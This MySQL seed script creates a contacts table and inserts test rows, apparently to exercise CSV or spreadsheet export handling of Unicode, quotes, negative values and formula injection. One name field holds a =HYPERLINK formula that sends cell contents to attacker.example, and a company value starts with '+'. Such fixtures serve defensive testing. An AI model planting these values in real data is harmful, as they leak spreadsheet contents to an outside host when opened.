SET NAMES utf8mb4;

CREATE TABLE contacts (
    id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    email VARCHAR(254) NOT NULL,
    company VARCHAR(100) NOT NULL DEFAULT '',
    spent_cents INT NOT NULL DEFAULT 0,      -- refunds can make it negative
    created_at DATETIME NOT NULL,
    INDEX (created_at)
) DEFAULT CHARSET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci;

-- Everything here came in through a signup form. Look at the last two.
INSERT INTO contacts (name, email, company, spent_cents, created_at) VALUES
    ('Ann Lee', 'ann@example.com', 'Acme, Inc.', 4200, '2026-11-02 10:00:00'),
    ('Zoë Łukasiewicz', 'zoe@example.com', 'Café "Kraków"', 1399, '2026-11-10 12:30:00'),
    ('渡辺 さくら', 'sakura@example.com', '', -500, '2026-11-15 09:15:00'),
    ('=HYPERLINK("https://attacker.example/?leak="&B2,"Click for details")', 'mallory@example.com', 'Totally Real Ltd', 0, '2026-11-20 08:00:00'),
    ('Bob', 'bob@example.com', '+1 (555) 0100', 0, '2026-11-25 16:45:00');
